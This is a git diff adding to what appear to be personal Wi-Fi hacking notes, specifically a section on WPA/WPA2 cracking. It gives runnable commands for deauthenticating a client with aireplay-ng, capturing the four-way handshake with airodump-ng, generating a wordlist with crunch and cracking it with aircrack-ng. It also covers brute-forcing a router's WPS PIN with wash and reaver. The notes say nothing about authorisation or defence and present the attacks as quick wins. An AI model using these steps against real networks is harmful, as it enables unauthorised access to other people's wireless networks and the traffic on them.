@@ -63,6 +63,39 @@ aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter
    Gets cracked instantly !
    
 2. WPA/WPA2 cracking:
+   
+   The goal is to capture the handshake (4 packets) between the router and a device.
+   
+   Step 1: run a deauthentication attack against a device connected to the router and wait for him to connect back to it OR wait for a new client to connect.
+           Catch the handshake using "airodump-ng".         
+           
+           The handshake doesn't contain data that helps recover the key, but it contains data that can be used to check if a key is valid or not !
+           useful infos in the handshake - MIC (Message Integrity Code): SP address, STA address, AP nonce, STA nonce, EAPOL, Payload
+   
+   Step 2:
+
+
+
+   Create a wordlist/dictionnary: "crunch" command
+              ex: "crunch 6 8 abc123 -o wordlist.txt" --> creates a wordlist of length 6 to 8 with characters abc123 in a file called wordlist.txt
+              "-d 1@" no repeating letter
+
+   combining the useful infos to the words in the wordlist with create new MICs and they will be compared to the real MIC
+   if(MIC* == MIC), then the word generating this MIC is the password !
+
+   To try this, run: aircrack-ng file_.cap_containing_handshake -w word_list
+
+
+   Another method: exploit WPS feature (except if PBC is enabled: Push Button Authentication)
+   allows clients to connect without a password
+   authentication is done using a 8 digit pin
+
+   wash --interface wlan0 : allows to see each router which has WPS enabled
+
+   launch "reaver --bssid router_addr --channel channel_number --interface wlan0 -vvv (verbose) --no-associate (we try to brute force manually cuz bugs with reaver)"
+   then "aireplay-ng --fakeauth 30 -a router_addr -h AR9271_addr wlan0"
+
+   PIN get cracked in under a minute
 
 ### Post-connection attacks
 
